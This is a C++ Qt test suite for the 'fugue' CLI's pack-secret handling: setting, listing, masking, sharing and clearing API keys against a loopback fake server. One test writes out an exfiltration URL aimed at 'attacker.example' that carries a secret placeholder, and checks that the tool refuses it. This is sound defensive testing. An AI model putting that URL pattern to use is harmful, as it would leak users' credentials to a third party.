// Pack secrets (spec 6.4, 6.7, #402) through the real `fugue`, in a scratch home: `pack secret` sets, lists and
// clears names (never values), the HTTP Request node uses its pack's key at run time against a fake server on the
// loopback, and nothing a run, a share copy or an error leaves behind holds the value.
//
// Seam: the built binary (as the user runs it); the trust question is answered through `script`, which gives the
// program a terminal. Values here are made up; no network beyond 127.0.0.1.

#include <QDir>
#include <QDirIterator>
#include <QEventLoop>
#include <QFile>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QProcess>
#include <QStandardPaths>
#include <QTemporaryDir>
#include <QTimer>
#include <QtTest>

#include "../engine/fake_http.h"

using fugue::test::FakeHttpServer;
using fugue::test::HttpRequest;
using fugue::test::HttpResponse;

namespace {

const QString kPack = QStringLiteral(FUGUE_SOURCE_DIR "/examples/packs/io.github.bmaltais.fugue-http");
const QString kPackId = QStringLiteral("io.github.bmaltais.fugue-http");
const QString kType = QStringLiteral("io.github.bmaltais.fugue-http/request");
const QByteArray kKey = "made-up-key-90210";

struct Outcome {
    int exitCode = -1;
    QByteArray out;
    QByteArray err;
    QJsonObject json() const { return QJsonDocument::fromJson(out).object(); }
    QString firstCode() const { return json().value("errors").toArray().at(0).toObject().value("code").toString(); }
};

QString shellQuote(const QString &text) { return "'" + QString(text).replace("'", "'\\''") + "'"; }

} // namespace

class TestPackSecretsCli : public QObject {
    Q_OBJECT

    QTemporaryDir m_dir;
    FakeHttpServer m_server;

    QProcessEnvironment fugueEnv() const {
        QProcessEnvironment env = QProcessEnvironment::systemEnvironment();
        env.remove("QT_QPA_PLATFORM");
        env.remove("DISPLAY");
        env.remove("WAYLAND_DISPLAY");
        env.insert("FUGUE_HOME", m_dir.filePath("fugue-home"));
        env.insert("XDG_DATA_HOME", m_dir.filePath("data"));
        env.insert("XDG_STATE_HOME", m_dir.filePath("state"));
        env.insert("XDG_CACHE_HOME", m_dir.filePath("cache"));
        env.insert("XDG_CONFIG_HOME", m_dir.filePath("config"));
        env.insert("HOME", m_dir.filePath("home"));
        return env;
    }

    // Runs `program`, feeds `input`, and waits with the event loop so the fake server answers meanwhile.
    Outcome spawn(const QString &program, const QStringList &args, const QByteArray &input, int waitMs = 120000) {
        QProcess process;
        process.setProcessEnvironment(fugueEnv());
        process.start(program, args);
        process.write(input);
        process.closeWriteChannel();
        QEventLoop loop;
        QTimer::singleShot(waitMs, &loop, &QEventLoop::quit);
        QObject::connect(&process, &QProcess::finished, &loop, &QEventLoop::quit);
        if (process.state() != QProcess::NotRunning)
            loop.exec();
        if (process.state() != QProcess::NotRunning) {
            process.kill();
            process.waitForFinished();
        }
        Outcome outcome;
        outcome.exitCode = process.exitCode();
        outcome.out = process.readAllStandardOutput();
        outcome.err = process.readAllStandardError();
        return outcome;
    }
    Outcome fugue(const QStringList &args, const QByteArray &input = {}) { return spawn(FUGUE_BINARY, args, input); }
    // `fugue <args>` with a terminal, answering `answers` (the install and trust question, the remove question).
    QByteArray withTerminal(const QStringList &args, const QByteArray &answers) {
        QStringList quoted;
        for (const QString &arg : args)
            quoted << shellQuote(arg);
        return spawn("script", {"-qec", shellQuote(FUGUE_BINARY) + " " + quoted.join(' '), "/dev/null"}, answers).out;
    }

    // Every file under the scratch folders, except `skip`, that holds `needle`.
    QStringList filesHolding(const QByteArray &needle, const QString &skip = {}) const {
        QStringList found;
        QDirIterator it(m_dir.path(), QDir::Files | QDir::Hidden | QDir::NoDotAndDotDot, QDirIterator::Subdirectories);
        while (it.hasNext()) {
            const QString path = it.next();
            if (path == skip)
                continue;
            QFile file(path);
            if (file.open(QIODevice::ReadOnly) && file.readAll().contains(needle))
                found << path;
        }
        return found;
    }

    QString secretsFile() const {
        QDirIterator it(m_dir.path(), {"pack-secrets.json"}, QDir::Files | QDir::Hidden, QDirIterator::Subdirectories);
        return it.hasNext() ? it.next() : QString();
    }

    QString workflow(const QJsonObject &inputs, const QString &name) {
        const QJsonObject flow{{"fugue", 1},
                               {"graph", QJsonObject{{"nodes", QJsonObject{{"call", QJsonObject{{"type", kType}, {"version", "1.0.0"}, {"inputs", inputs}}}}}}}};
        const QString path = m_dir.filePath(name);
        QFile file(path);
        if (!file.open(QIODevice::WriteOnly))
            qFatal("cannot write %s", qPrintable(path));
        file.write(QJsonDocument(flow).toJson());
        return path;
    }

private slots:
    void initTestCase() {
        QVERIFY(m_server.listen());
        m_server.on("POST", "/hook", [](const HttpRequest &request) {
            return HttpResponse{200, QJsonDocument(QJsonObject{{"key", QString::fromUtf8(request.headers.value("x-api-key"))}}).toJson(QJsonDocument::Compact)};
        });
        if (QStandardPaths::findExecutable("script").isEmpty())
            QSKIP("script (util-linux) is needed to give the program a terminal");
        const QByteArray shown = withTerminal({"pack", "add", kPack}, "y\n");
        QVERIFY2(QFileInfo(m_dir.filePath("fugue-home/data/fugue/packs/" + kPackId + "/pack.json")).isFile(), shown.constData());
        // The trust prompt lists the secrets the pack reads, by name.
        QVERIFY2(shown.contains("token_1") && shown.contains("token_3"), shown.constData());
        QVERIFY2(shown.contains("advisory"), shown.constData()); // isolation between packs is said to be advisory
    }

    void secretsAreListedByNameAsNotSetFirst() {
        const Outcome listed = fugue({"pack", "secret", "list", "--json"});
        QCOMPARE(listed.exitCode, 0);
        const QJsonArray secrets = listed.json().value("data").toObject().value("packs").toArray().at(0).toObject().value("secrets").toArray();
        QCOMPARE(secrets.size(), 3);
        QCOMPARE(secrets.at(0).toObject().value("name").toString(), QString("token_1"));
        QVERIFY(!secrets.at(0).toObject().value("set").toBool());
    }

    void aRunBeforeTheSecretIsSetFailsNamingItAndNothingIsSent() {
        const QString file = workflow({{"method", "POST"}, {"url", QString(m_server.origin()) + "/hook"}, {"headers", "X-Api-Key: {secret:token_1}"}}, "call.fugue");
        const int before = m_server.requestsTo("POST", "/hook").size();
        const Outcome ran = fugue({"run", file, "--wait", "--json"});
        QVERIFY(ran.exitCode != 0);
        QVERIFY2((ran.out + ran.err).contains("secret_missing"), (ran.out + ran.err).constData());
        QCOMPARE(m_server.requestsTo("POST", "/hook").size(), before);
    }

    void setReadsTheValueFromStdinKeepsItOutOfEveryListingAndStoresItOwnerOnly() {
        // A name the pack does not declare, a value that is empty or many lines, and a pack that is not there are refused.
        QCOMPARE(fugue({"pack", "secret", "set", kPackId, "api_key", "--json"}, kKey).firstCode(), QString("usage"));
        QCOMPARE(fugue({"pack", "secret", "set", kPackId, "token_1", "--json"}, "").firstCode(), QString("usage"));
        // The HTTP pack needs the origin a key is for: none, or one that is not an origin, is refused and nothing is stored.
        QCOMPARE(fugue({"pack", "secret", "set", kPackId, "token_1", "--json"}, kKey).firstCode(), QString("usage"));
        QCOMPARE(fugue({"pack", "secret", "set", kPackId, "token_1", "--origin", "api.example.com", "--json"}, kKey).firstCode(), QString("usage"));
        QCOMPARE(fugue({"pack", "secret", "set", kPackId, "token_1", "--origin", "https://api.example.com/v1", "--json"}, kKey).firstCode(), QString("usage"));
        QCOMPARE(fugue({"pack", "secret", "set", kPackId, "token_1", "--json"}, "a\nb\n").firstCode(), QString("usage"));
        QCOMPARE(fugue({"pack", "secret", "set", "io.nothing.here", "token_1", "--json"}, kKey).firstCode(), QString("unknown_pack"));
        QVERIFY(secretsFile().isEmpty()); // nothing was stored by any of those

        const Outcome set = fugue({"pack", "secret", "set", kPackId, "token_1", "--origin", QString(m_server.origin()), "--json"}, kKey + "\n");
        QCOMPARE(set.exitCode, 0);
        QVERIFY2(!(set.out + set.err).contains(kKey), "set echoed the value");
        const Outcome listed = fugue({"pack", "secret", "list", "--json"});
        QVERIFY(!(listed.out + listed.err).contains(kKey));
        const QJsonObject first = listed.json().value("data").toObject().value("packs").toArray().at(0).toObject().value("secrets").toArray().at(0).toObject();
        QVERIFY(first.value("set").toBool());
        QCOMPARE(first.value("origin").toString(), QString(m_server.origin())); // where it may be sent, shown; the value never

        const QString stored = secretsFile();
        QVERIFY(!stored.isEmpty());
        QVERIFY(stored.contains("/config/") || stored.contains("/fugue-home/")); // the config folder of the root
        QVERIFY(!stored.contains("/packs/")); // never in a pack folder
        QCOMPARE(QFileInfo(stored).permissions() & ~QFileDevice::Permissions(QFileDevice::ReadOwner | QFileDevice::WriteOwner | QFileDevice::ReadUser | QFileDevice::WriteUser), QFileDevice::Permissions());
        QCOMPARE(filesHolding(kKey), QStringList{stored}); // the only file that holds it
    }

    void aRunUsesTheKeyAndLeavesNoCopyInRunRecordsEventsLogsOrTheCache() {
        const QString file = workflow({{"method", "POST"}, {"url", QString(m_server.origin()) + "/hook"}, {"headers", "X-Api-Key: {secret:token_1}"}, {"path1", "key"}},
                                      "keyed.fugue");
        const Outcome ran = fugue({"run", file, "--wait", "--json"});
        QCOMPARE(ran.exitCode, 0);
        QVERIFY2(ran.out.contains("run.done"), ran.out.constData());
        QCOMPARE(m_server.requestsTo("POST", "/hook").last().headers.value("x-api-key"), kKey); // the server got the real key
        // The server echoed it back; the node masked it, so the output, run.json, events and caches say ***.
        QVERIFY2(!(ran.out + ran.err).contains(kKey), "the run's own output holds the key");
        QVERIFY2((ran.out + ran.err).contains("***"), (ran.out + ran.err).constData());
        const QStringList holding = filesHolding(kKey, secretsFile());
        QVERIFY2(holding.isEmpty(), qPrintable(holding.join('\n')));
    }

    // A shared workflow that names another address for the key is refused when it runs, and nothing is sent.
    void aWorkflowThatSendsTheKeyToAnotherAddressIsRefusedAndNothingLeaves() {
        const int before = m_server.requests().size();
        for (const QString &url : {QStringLiteral("https://attacker.example/c?k={secret:token_1}"), QString(m_server.origin()).replace("127.0.0.1", "127.0.0.2") + "/hook"}) {
            const QString file = workflow({{"method", "POST"}, {"url", url}, {"headers", "X-Api-Key: {secret:token_1}"}}, "attack.fugue");
            const Outcome ran = fugue({"run", file, "--wait", "--json"});
            QVERIFY(ran.exitCode != 0);
            QVERIFY2((ran.out + ran.err).contains("is only for"), (ran.out + ran.err).constData());
            QVERIFY(!(ran.out + ran.err).contains(kKey));
        }
        QCOMPARE(m_server.requests().size(), before);
    }

    void aShareCopyAndItsContentsHoldNoKey() {
        const QString file = workflow({{"method", "POST"}, {"url", QString(m_server.origin()) + "/hook"}, {"headers", "X-Api-Key: {secret:token_1}"}}, "shared.fugue");
        const QString out = m_dir.filePath("shared.fuguepack");
        const Outcome shared = fugue({"workflow", "export", file, "--share", "--out", out, "--json"});
        QCOMPARE(shared.exitCode, 0);
        QVERIFY(QFileInfo(out).isFile());
        QVERIFY(!(shared.out + shared.err).contains(kKey));
        QFile pack(out);
        QVERIFY(pack.open(QIODevice::ReadOnly));
        QVERIFY(!pack.readAll().contains(kKey));
        // The package is a zip: read what is inside it too, not only its compressed bytes.
        if (!QStandardPaths::findExecutable("unzip").isEmpty()) {
            const Outcome inside = spawn("unzip", {"-p", out}, {});
            QCOMPARE(inside.exitCode, 0);
            QVERIFY(!inside.out.isEmpty());
            QVERIFY(!inside.out.contains(kKey));
            QVERIFY(inside.out.contains("{secret:token_1}")); // the placeholder travels, never the value
        }
    }

    void clearDropsTheValueAndRemovingThePackForgetsItsSecrets() {
        QCOMPARE(fugue({"pack", "secret", "clear", kPackId, "token_1", "--json"}).exitCode, 0);
        QVERIFY(filesHolding(kKey).isEmpty());
        QCOMPARE(fugue({"pack", "secret", "set", kPackId, "token_2", "--origin", "https://api.example.com", "--json"}, "made-up-key-55555\n").exitCode, 0);
        QVERIFY(!filesHolding("made-up-key-55555").isEmpty());
        withTerminal({"pack", "remove", kPackId}, "y\n");
        QVERIFY(!QFileInfo(m_dir.filePath("fugue-home/data/fugue/packs/" + kPackId)).exists());
        QVERIFY2(filesHolding("made-up-key-55555").isEmpty(), "removing a pack leaves its keys behind");
    }
};

QTEST_GUILESS_MAIN(TestPackSecretsCli)
#include "test_cli_pack_secrets.moc"
